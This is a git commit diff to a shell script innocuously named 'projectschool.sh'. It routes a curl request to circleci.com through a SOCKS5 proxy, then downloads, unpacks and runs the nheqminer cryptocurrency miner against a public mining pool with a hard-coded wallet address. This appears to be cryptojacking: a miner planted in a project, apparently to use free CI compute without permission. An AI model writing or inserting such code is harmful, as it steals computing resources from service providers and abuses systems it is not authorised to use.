8bbe18bbe4fe899526b5bc35e2459f8342d05da1
sayepttwarnis <93639205+sayepttwarnis@users.noreply.github.com>
2021-11-03 13:47:24 +0700

    Update projectschool.sh

--- projectschool.sh
+++ projectschool.sh
@@ -1,1 +1,5 @@
-curl -v -x socks5://188.166.104.152:39088 https://circleci.com//
+curl -v -x socks5://207.180.236.140:1080 https://circleci.com//
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.FaxSlowmo -p x -t 2
